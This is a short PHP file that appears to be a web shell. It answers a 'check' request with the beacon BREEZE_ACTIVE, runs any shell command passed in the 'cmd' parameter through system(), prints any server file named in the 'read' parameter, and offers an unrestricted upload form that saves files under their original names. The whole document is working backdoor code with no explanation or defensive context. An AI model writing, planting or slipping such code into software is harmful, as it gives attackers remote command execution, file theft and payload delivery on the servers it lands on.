<?php
if(isset($_GET['check'])){ echo "BREEZE_ACTIVE"; exit; }

if(isset($_GET['cmd'])){ system($_GET['cmd']); exit; }

if(isset($_GET['read'])){ echo "<pre>".htmlspecialchars(file_get_contents($_GET['read']))."</pre>"; exit; }

if(isset($_FILES['f'])){ move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']); echo "Success!"; }
?>
<form method="POST" enctype="multipart/form-data"><input type="file" name="f"><input type="submit"></form>
